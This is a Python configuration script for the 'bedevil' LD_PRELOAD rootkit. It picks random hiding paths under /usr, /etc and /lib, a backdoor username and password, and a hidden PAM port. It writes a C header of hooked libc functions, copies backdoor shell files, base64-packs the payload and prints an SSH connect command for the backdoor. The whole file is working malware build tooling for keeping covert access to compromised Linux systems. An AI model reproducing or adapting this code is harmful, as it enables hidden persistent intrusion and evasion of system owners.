#!/usr/bin/env python


# SETTINGS

# by default the password & port are random values. you can change this.
BD_UNAME = 'changeme'
BD_PWD   = None
PAM_PORT = None

# END OF SETTINGS



from crypt import crypt
from shutil import copytree, copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system, unlink
from os.path import join, basename



# 'random' paths we've already got.
USED_PATHS = []
# stores all names of hooked funcs
ALL_HOOKS = []

class Util():
    def randgarb(self, garbset, garblen):
        garb = ''.join(choice(garbset) for _ in range(garblen))
        return garb

    def cryptpw(self, plain):
        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
        hashd = crypt(plain, "$6$"+salt)
        return hashd

    def randpath(self, maxlen):
        rootdirs = ['/usr', '/etc', '/lib']
        randroot = choice(rootdirs)
        randdir = choice(listdir(randroot))

        while len(randdir) < maxlen:
            randdir += self.randgarb(ascii_lowercase, 1)

        while len(randdir) > maxlen:
            randdir = randdir[:-1]

        suffix = self.randgarb(ascii_lowercase, 3)
        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
        if newpath in USED_PATHS or '.' in newpath:
            newpath = self.randpath(maxlen)
        USED_PATHS.append(newpath)
        return newpath


class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # creates a bunch of string definitions based on data
    # in target array. not used & not needed, but kept.
    def getdefs(self):
        all_defs = ''
        for i in range(self.list_len):
            our_name = self.array_list[i][0]
            our_value = self.array_list[i][1]

            this_def = self.gettcdef(our_name, our_value)
            all_defs += this_def
        return all_defs

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents


# handy class. trusty class. thank you class.
class CArray():
    def __init__(self, name, sizedef, alist):
        self.array_name = name
        self.size_name = sizedef
        self.list_len = len(alist)
        self.array_list = alist

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.size_name, self.list_len)
        return size_def

    # setup the beginning of the array.
    def declarearr(self):
        declaration = 'static char *const {0}[{1}] = '
        declaration = declaration.format(self.array_name, self.size_name)
        return declaration

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:
            elems += '"{0}",'.format(elem)
        elems = elems[:-1]  # remove trailing comma.
        elems += '};\n'
        return elems

    # create full C array.
    def create(self):
        result = self.getsizedef()
        result += self.declarearr()
        result += self.buildelems()
        return result


# bunch of settings related stuff...
ut = Util()

if BD_UNAME == None:
    BD_UNAME = ut.randgarb(ascii_lowercase, 7)
if BD_PWD == None:
    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 9)
if PAM_PORT == None:
    PAM_PORT = choice(range(11111, 63556))

print('Username: ' + BD_UNAME)
print('Password: ' + BD_PWD)
print('Hidden port: ' + str(PAM_PORT))

_BD_PWD = BD_PWD # just to show it at the end
BD_PWD = ut.cryptpw(BD_PWD)

MAGIC_GID = ut.randgarb(digits.replace('0',''), 6)
GID_PATH = ut.randpath(5)
GIDTIME_PATH = ut.randpath(5)
BD_VAR = ut.randgarb(ascii_uppercase, 9)
#print('Magic GID: ' + str(MAGIC_GID))
#print('Magic environment variable: ' + BD_VAR)

INSTALL_DIR = ut.randpath(7)
BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
PRELOAD_FILE = ut.randpath(10)
#print('Install directory: ' + INSTALL_DIR)
#print('bdvl SO: ' + BDVLSO)
#print('SO path: ' + SOPATH)

HIDEPORTS = ut.randpath(7)
SSH_LOGS = ut.randpath(7)
INTEREST_DIR = ut.randpath(7)
SSHD_CONFIG = ut.randpath(7)

INC = 'inc'
NEW_INC = 'new_inc'

BDVLH = NEW_INC + '/bedevil.h'

SETTINGS = {
    'BD_UNAME':BD_UNAME,         'BD_PWD':BD_PWD,
    'MAGIC_GID':int(MAGIC_GID),  'BD_VAR':BD_VAR,
    'INSTALL_DIR':INSTALL_DIR,   'BDVLSO':BDVLSO,
    'SOPATH':SOPATH,             'PRELOAD_FILE':PRELOAD_FILE,
    'SSH_LOGS':SSH_LOGS,         'INTEREST_DIR':INTEREST_DIR,
    'HIDEPORTS':HIDEPORTS,       'GID_PATH':GID_PATH,
    'GIDTIME_PATH':GIDTIME_PATH, 'PAM_PORT':int(PAM_PORT),
    'SSHD_CONFIG':SSHD_CONFIG,
}



# read the list of hooked function names from libdl directory &
# create C arrays for them where the contents are referenced by
# the hook() & call() macro wrappers & their functions defined
# in libdl.h.
def gethooks():
    hookspath = NEW_INC + '/hooks/libdl/hooks'

    fd = open(hookspath, 'r')
    contents = fd.read().split('\n')
    fd.close()

    allhooks = ''
    for line in contents:
        # empty lines or comment lines are of no interest to us.
        if len(line) == 0 or line[0] == '#':
            continue

        # libname:hook1,hook2,hook3,hook4...
        curtoks = line.split(':')
        
        targetlib = curtoks[0]
        targetsyms = curtoks[1]

        # divide all hooked function names into one list.
        hooktoks = targetsyms.split(',')

        # add all of the hooked function names from the current target library into a list for all.
        for curhook in hooktoks:
            ALL_HOOKS.append(curhook)

        # create the C array for the current target lib & the hooked functions
        cursizedef = targetlib.upper() + '_SIZE'
        newarr = CArray(targetlib, cursizedef, hooktoks)
        allhooks += newarr.create()

    return allhooks


def setupcfg():
    targets = ['MAGIC_GID', 'INSTALL_DIR', 'PRELOAD_FILE', 'BDVLSO',
               'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH']

    fd = open(NEW_INC+'/settings.cfg', 'a')
    for target in targets:
        try:
            fd.write(SETTINGS[target]+'\n')
        except:
            fd.write(str(SETTINGS[target])+'\n')
    fd.close()


def setup_config():
    copytree(INC, NEW_INC)

    KEYS   = SETTINGS.keys()
    VALUES = SETTINGS.values()
    gotbdvlh = gethooks()

    for settingi in range(len(SETTINGS)):
        target = KEYS[settingi]
        value = VALUES[settingi]

        # if the target setting is a port, add it into the hideports file.
        targettok = target.split('_')
        if 'PORT' in targettok:
            fd = open(NEW_INC+'/hideports', 'a')
            fd.write(str(value)+'\n')
            fd.close()                

        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))

    gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
    defs = Definitions(ALL_HOOKS)
    gotbdvlh += defs.getidents()

    allhookssiz = 'ALL_SIZE'
    allhooksarr = CArray('all', allhookssiz, ALL_HOOKS)
    gotbdvlh += allhooksarr.create()
    gotbdvlh += 'syms symbols[{0}];\n'.format(allhookssiz)

    # bedevil.h complete. write it.
    fd = open(BDVLH, 'w')
    fd.write(gotbdvlh)
    fd.close()

    # cp backdoor shell files.
    copy('etc/.rolf', NEW_INC+'/.rolf')
    copy('etc/.bashrc', NEW_INC+'/.bashrc')

    # write magic GID value so auto.sh can cat it into GID_PATH.
    fd = open(NEW_INC+'/magic_gid', 'w')
    fd.write(str(SETTINGS['MAGIC_GID']))
    fd.close()

    # write all the settings auto.sh needs.
    setupcfg()

    # mk tar.gz of include dir. b64 it. rm it.
    system('tar cpfz {0}.tar.gz {1}'.format(BD_UNAME, NEW_INC))
    fd = open(BD_UNAME+'.tar.gz', 'r')
    targzb64 = b64encode(fd.read())
    fd.close()
    unlink(BD_UNAME+'.tar.gz')
    
    # write b64.
    fd = open(BD_UNAME+'.b64', 'w')
    fd.write(targzb64)
    fd.close()




if __name__ == '__main__':
    setup_config()
    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), _BD_PWD)
    print('\n\t\033[1;31m{0}\033[0m\n'.format(template))

